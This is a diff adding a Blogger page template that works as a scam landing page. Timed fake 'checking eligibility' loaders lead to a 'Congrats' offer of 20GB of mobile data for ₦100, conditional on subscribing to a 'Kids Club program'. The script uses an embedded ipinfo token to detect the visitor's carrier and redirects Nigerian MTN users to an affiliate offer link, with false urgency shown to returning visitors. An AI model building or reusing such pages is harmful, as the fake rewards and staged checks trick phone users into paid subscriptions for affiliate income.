@@ -1,0 +1,745 @@
+
+<!DOCTYPE html>
+<html class='v2' dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'><head>
+<link href='https://www.blogger.com/static/v1/widgets/2872013778-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
+<meta charset='UTF-8'/>
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<title>Light of God</title>
+<link href='https://fonts.googleapis.com' rel='preconnect'/>
+<link crossorigin='anonymous' href='https://fonts.gstatic.com' rel='preconnect'/>
+<link href='https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap' rel='stylesheet'/>
+<style id="page-skin-1" type="text/css"><!--
+* {
+box-sizing: border-box;
+}
+html,
+body {
+margin: 0;
+padding: 0;
+width: 100%;
+min-height: 100%;
+}
+body {
+font-family: 'Inter', sans-serif;
+background: #eef2f5;
+color: #0f172a;
+min-height: 100vh;
+display: flex;
+align-items: center;
+justify-content: center;
+padding: 16px;
+-webkit-font-smoothing: antialiased;
+text-rendering: optimizeLegibility;
+}
+.page-wrapper {
+width: 100%;
+max-width: 448px;
+margin: 0 auto;
+}
+.card {
+width: 100%;
+background: #ffffff;
+border-radius: 32px;
+padding: 24px;
+box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+text-align: center;
+position: relative;
+transition: all 0.3s ease;
+}
+.process-box {
+display: flex;
+flex-direction: column;
+align-items: center;
+padding: 32px 0;
+gap: 24px;
+}
+.process-box h1 {
+margin: 0;
+font-size: 20px;
+line-height: 1.3;
+font-weight: 700;
+letter-spacing: -0.02em;
+color: #1e293b;
+}
+.custom-loader {
+border: 5px solid #f1f5f9;
+border-top: 5px solid #eab308;
+border-radius: 50%;
+width: 70px;
+height: 70px;
+animation: spin 1s linear infinite;
+}
+@keyframes spin {
+100% {
+transform: rotate(360deg);
+}
+}
+.process-info {
+text-align: center;
+}
+.process-info p {
+margin: 0;
+}
+.process-text {
+font-size: 14px;
+line-height: 1.5;
+color: #475569;
+font-weight: 500;
+}
+.dont-refresh {
+margin-top: 4px !important;
+font-size: 12px;
+color: #94a3b8;
+}
+.hidden {
+display: none !important;
+}
+.congrats-box {
+display: flex;
+flex-direction: column;
+align-items: center;
+padding: 8px 0;
+}
+.title-text {
+margin: 0 0 4px 0;
+font-size: 24px;
+line-height: 1.2;
+font-weight: 800;
+color: #0f172a;
+}
+.offer-message {
+margin: 0 0 20px 0;
+font-size: 14px;
+line-height: 1.5;
+color: #64748b;
+font-weight: 500;
+}
+.bundle-text {
+margin-bottom: 8px;
+font-size: 30px;
+line-height: 1.2;
+font-weight: 900;
+color: #2563eb;
+letter-spacing: -0.03em;
+}
+.price-text {
+display: inline-block;
+padding: 6px 16px;
+margin-bottom: 24px;
+border-radius: 999px;
+font-size: 14px;
+font-weight: 700;
+background: #dbeafe;
+color: #1d4ed8;
+}
+.info-box {
+width: 100%;
+background: #f8fafc;
+border: 2px solid #e2e8f0;
+border-radius: 16px;
+padding: 16px;
+margin-bottom: 24px;
+text-align: left;
+box-shadow: inset 0 1px 3px rgba(0,0,0,0.03);
+}
+.info-box p {
+margin: 0;
+font-size: 14px;
+line-height: 1.65;
+color: #1e293b;
+font-weight: 500;
+}
+.info-box strong {
+color: #000000;
+font-weight: 700;
+}
+.subscribe-btn {
+width: 100%;
+border: 0;
+outline: none;
+background: #febb02;
+color: #0f172a;
+font-family: inherit;
+font-size: 16px;
+font-weight: 900;
+letter-spacing: 0.05em;
+border-radius: 40px;
+padding: 10px 10px 10px 32px;
+display: flex;
+align-items: center;
+justify-content: space-between;
+cursor: pointer;
+box-shadow: 0 10px 25px rgba(234,179,8,0.10);
+transition: all 0.2s ease;
+}
+.subscribe-btn:hover {
+background: #e2a700;
+}
+.subscribe-btn:active {
+transform: scale(0.99);
+}
+.subscribe-btn:disabled {
+cursor: wait;
+}
+.subscribe-label {
+text-transform: uppercase;
+letter-spacing: 0.14em;
+font-size: 12px;
+font-weight: 900;
+}
+.arrow-circle {
+width: 48px;
+height: 48px;
+min-width: 48px;
+background: #ffffff;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+transition: transform 0.2s ease;
+}
+.subscribe-btn:hover .arrow-circle {
+transform: translateX(2px);
+}
+.arrow-circle svg {
+width: 20px;
+height: 20px;
+color: #10b981;
+stroke-width: 3.5;
+}
+.processing-label {
+margin: 0 auto;
+text-transform: uppercase;
+letter-spacing: 0.14em;
+font-size: 12px;
+font-weight: 900;
+}
+.processing-icon {
+width: 48px;
+height: 48px;
+display: flex;
+align-items: center;
+justify-content: center;
+background: transparent;
+}
+.processing-icon svg {
+width: 20px;
+height: 20px;
+animation: spin 1s linear infinite;
+}
+.main-section {
+display: none;
+}
+@media (max-width: 480px) {
+body {
+padding: 12px;
+}
+.card {
+padding: 20px;
+border-radius: 28px;
+}
+.process-box {
+padding: 28px 0;
+}
+.bundle-text {
+font-size: 28px;
+}
+}
+
+--></style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+<script type="text/javascript" language="javascript">
+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
+
+<!-- CSS_ADSBLOCK_START -->
+<link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
+<!-- CSS_ADSBLOCK_END -->
+</head><body>
+<div class='page-wrapper'><div class='card'>
+<div class='process-box' id='processBox'>
+<h1>
+      Please wait.. Checking if you qualify
+    </h1>
+<div class='custom-loader'></div>
+<div class='process-info'>
+<p class='process-text' id='processText'>
+        Checking eligibility for the selected offer...
+      </p>
+<p class='dont-refresh'>
+        Please do not refresh this page
+      </p>
+</div>
+</div>
+<div class='congrats-box hidden' id='congratsBox'>
+<h2 class='title-text' id='titleText'>
+      Congrats!
+    </h2>
+<p class='offer-message' id='offerMessage'>
+      You qualified for the Data below:
+    </p>
+<div class='bundle-text' id='bundleText'>
+      20GB DATA
+    </div>
+<div class='price-text' id='priceText'>
+      &#8358;100 ONLY
+    </div>
+<div class='info-box'>
+<p>
+        To Receive Data - Subscribe our Kids Club program 
+        <strong></strong>
+        to receive Data and Comfirm your number when Subscribing.
+      </p>
+</div>
+<button class='subscribe-btn' id='subBtn' type='button'>
+<span class='subscribe-label'>
+        SUBSCRIBE NOW
+      </span>
+<div class='arrow-circle'>
+<svg fill='none' stroke='currentColor' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
+<path d='M14 5l7 7m0 0l-7 7m7-7H3' stroke-linecap='round' stroke-linejoin='round'></path>
+</svg>
+</div>
+</button>
+</div>
+</div>
+</div><div class='main-section no-items section' id='main'></div>
+<script type='text/javascript'>
+  //<![CDATA[
+
+  const params =
+    new URLSearchParams(window.location.search);
+
+  const bundle =
+    params.get("bundle") || "20GB";
+
+  const price =
+    params.get("price") || "200";
+
+
+  /*
+   * RETURNING VISITOR UI
+   */
+
+  function applyReturningVisitorUI() {
+
+    const processBox =
+      document.getElementById("processBox");
+
+    const congratsBox =
+      document.getElementById("congratsBox");
+
+    const bundleText =
+      document.getElementById("bundleText");
+
+    const offerMessage =
+      document.getElementById("offerMessage");
+
+    const titleText =
+      document.getElementById("titleText");
+
+    const priceBox =
+      document.getElementById("priceText");
+
+    const btn =
+      document.getElementById("subBtn");
+
+
+    if (processBox) {
+      processBox.classList.add("hidden");
+    }
+
+    if (congratsBox) {
+      congratsBox.classList.remove("hidden");
+    }
+
+    if (bundleText) {
+      bundleText.innerText =
+        bundle + " DATA";
+    }
+
+
+    if (offerMessage) {
+
+      offerMessage.innerHTML =
+        '<span style="color:#e11d48;font-weight:700;' +
+        'background:#fff1f2;padding:2px 8px;' +
+        'border-radius:6px;border:1px solid #ffe4e6;">' +
+        '⚠️ You may not qualify again.' +
+        '</span>' +
+        '<br/>' +
+        '<span style="display:inline-block;margin-top:8px;">' +
+        'Follow the process to receive your data bundle.' +
+        '</span>';
+
+    }
+
+
+    if (titleText) {
+      titleText.style.display = "none";
+    }
+
+
+    if (priceBox) {
+      priceBox.innerText =
+        "Valid for 30 days";
+    }
+
+
+    if (btn) {
+
+      btn.disabled = false;
+
+      btn.innerHTML =
+        '<span class="subscribe-label">' +
+        'SUBSCRIBE NOW' +
+        '</span>' +
+
+        '<div class="arrow-circle">' +
+
+        '<svg xmlns="http://www.w3.org/2000/svg" ' +
+        'fill="none" viewBox="0 0 24 24" ' +
+        'stroke="currentColor">' +
+
+        '<path stroke-linecap="round" ' +
+        'stroke-linejoin="round" ' +
+        'd="M14 5l7 7m0 0l-7 7m7-7H3"/>' +
+
+        '</svg>' +
+
+        '</div>';
+
+    }
+
+  }
+
+
+  /*
+   * HANDLE BACK BUTTON / BFCACHE
+   */
+
+  window.addEventListener(
+    'pageshow',
+    function(event) {
+
+      if (
+        localStorage.getItem("visited") === "true"
+      ) {
+
+        applyReturningVisitorUI();
+
+      }
+
+    }
+  );
+
+
+  /*
+   * CHANGE PROCESSING TEXT AFTER 4 SECONDS
+   */
+
+  setTimeout(
+    function() {
+
+      if (
+        localStorage.getItem("visited") !== "true"
+      ) {
+
+        const processText =
+          document.getElementById("processText");
+
+        if (processText) {
+
+          processText.innerText =
+            "Checking if eligible…";
+
+        }
+
+      }
+
+    },
+    4000
+  );
+
+
+  /*
+   * SHOW OFFER AFTER 8 SECONDS
+   */
+
+  setTimeout(
+    function() {
+
+      if (
+        localStorage.getItem("visited") === "true"
+      ) {
+
+        return;
+
+      }
+
+
+      const processBox =
+        document.getElementById("processBox");
+
+      const congratsBox =
+        document.getElementById("congratsBox");
+
+      const bundleText =
+        document.getElementById("bundleText");
+
+      const priceText =
+        document.getElementById("priceText");
+
+
+      if (processBox) {
+        processBox.classList.add("hidden");
+      }
+
+      if (congratsBox) {
+        congratsBox.classList.remove("hidden");
+      }
+
+      if (bundleText) {
+        bundleText.innerText =
+          bundle + " DATA";
+      }
+
+      if (priceText) {
+        priceText.innerText =
+          "₦" + price + " ONLY";
+      }
+
+    },
+    10000
+  );
+
+
+  /*
+   * IPINFO NETWORK DETECTION
+   */
+
+  function detectNetwork() {
+
+    const IPINFO_TOKEN =
+      "55355b912bdc12";
+
+    fetch(
+      "https://ipinfo.io/json?token=" +
+      IPINFO_TOKEN
+    )
+
+    .then(function(res) {
+
+      if (!res.ok) {
+        throw new Error("IPinfo request failed");
+      }
+
+      return res.json();
+
+    })
+
+    .then(function(data) {
+
+      const network =
+        data.org
+          ? data.org.toLowerCase()
+          : "";
+
+      const country =
+        data.country
+          ? data.country.toUpperCase()
+          : "";
+
+      /*
+       * ONLY APPLY NIGERIAN NETWORK ROUTING
+       */
+
+      if (country === "NG") {
+
+        /*
+         * MTN
+         */
+
+        if (network.includes("mtn")) {
+
+          window.location.href =
+            "https://www.undertheseais.work/click?offer_id=37773&pub_id=296946&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE";
+
+          return;
+        }
+
+
+        /*
+         * AIRTEL
+         */
+
+        if (network.includes("airtel")) {
+
+          window.location.href =
+            "https://educationalcontentt.blogspot.com/?m=1";
+
+          return;
+        }
+
+
+        /*
+         * GLO
+         */
+
+        if (
+          network.includes("glo") ||
+          network.includes("globacom")
+        ) {
+
+          window.location.href =
+            "https://educationalcontentt.blogspot.com/?m=1";
+
+          return;
+        }
+
+
+        /*
+         * 9MOBILE
+         */
+
+        if (
+          network.includes("9mobile") ||
+          network.includes("etisalat")
+        ) {
+
+          window.location.href =
+            "https://educationalcontentt.blogspot.com/?m=1";
+
+          return;
+        }
+
+      }
+
+
+      /*
+       * DEFAULT / UNKNOWN NETWORK
+       */
+
+      window.location.href =
+        "https://educationalcontentt.blogspot.com/?m=1";
+
+    })
+
+    .catch(function() {
+
+      /*
+       * IF IPINFO FAILS, USE NORMAL REDIRECT
+       */
+
+      window.location.href =
+        "https://educationalcontentt.blogspot.com/?m=1";
+
+    });
+
+  }
+
+
+  /*
+   * CTA BUTTON
+   */
+
+  document.addEventListener(
+    "DOMContentLoaded",
+    function() {
+
+      const btn =
+        document.getElementById("subBtn");
+
+
+      if (!btn) {
+        return;
+      }
+
+
+      btn.addEventListener(
+        "click",
+        function() {
+
+          localStorage.setItem(
+            "visited",
+            "true"
+          );
+
+
+          btn.disabled = true;
+
+
+          btn.innerHTML =
+
+            '<span class="processing-label">' +
+            'Processing...' +
+            '</span>' +
+
+            '<div class="processing-icon">' +
+
+            '<svg xmlns="http://www.w3.org/2000/svg" ' +
+            'fill="none" viewBox="0 0 24 24">' +
+
+            '<circle cx="12" cy="12" r="10" ' +
+            'stroke="currentColor" ' +
+            'stroke-width="4" ' +
+            'opacity=".25"></circle>' +
+
+            '<path fill="currentColor" ' +
+            'opacity=".75" ' +
+            'd="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z">' +
+            '</path>' +
+
+            '</svg>' +
+
+            '</div>';
+
+
+          /*
+           * RUN IPINFO DETECTION
+           */
+
+          setTimeout(
+            function() {
+
+              detectNetwork();
+
+            },
+            1
+          );
+
+        }
+      );
+
+    }
+  );
+
+  //]]>
+  </script><!--It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customise it or replace it with your own notice. See http://www.blogger.com/go/cookiechoices for more details.-->
+<script defer='' src='/js/cookienotice.js'></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function(event) {
+      window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
+          (window.cookieOptions && cookieOptions.msg) || 'This site uses cookies from Google to deliver its services and to analyse traffic. Your IP address and user agent are shared with Google, together with performance and security metrics, to ensure quality of service, generate usage statistics and to detect and address abuse.',
+          (window.cookieOptions && cookieOptions.close) || 'Got it',
+          (window.cookieOptions && cookieOptions.learn) || 'Learn more',
+          (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
+    });
+  </script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/851759228-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AAPvtVmGbPxgGuIdKW0LCZZqnukz:1790630368005';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d3220645977795167437','//knowledgeablecontentt.blogspot.com/','3220645977795167437');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '3220645977795167437', 'title': 'Knowledgeable content', 'url': 'https://knowledgeablecontentt.blogspot.com/', 'canonicalUrl': 'https://knowledgeablecontentt.blogspot.com/', 'homepageUrl': 'https://knowledgeablecontentt.blogspot.com/', 'searchUrl': 'https://knowledgeablecontentt.blogspot.com/search', 'canonicalHomepageUrl': 'https://knowledgeablecontentt.blogspot.com/', 'blogspotFaviconUrl': 'https://knowledgeablecontentt.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': true, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Knowledgeable content - Atom\x22 href\x3d\x22https://knowledgeablecontentt.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Knowledgeable content - RSS\x22 href\x3d\x22https://knowledgeablecontentt.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Knowledgeable content - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/3220645977795167437/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/14465952656009604718\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/31d4351e075118ef', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'index', 'pageName': '', 'pageTitle': 'Knowledgeable content'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Knowledgeable content', 'description': '', 'url': 'https://knowledgeablecontentt.blogspot.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
+</script>
+</body>
+</html>
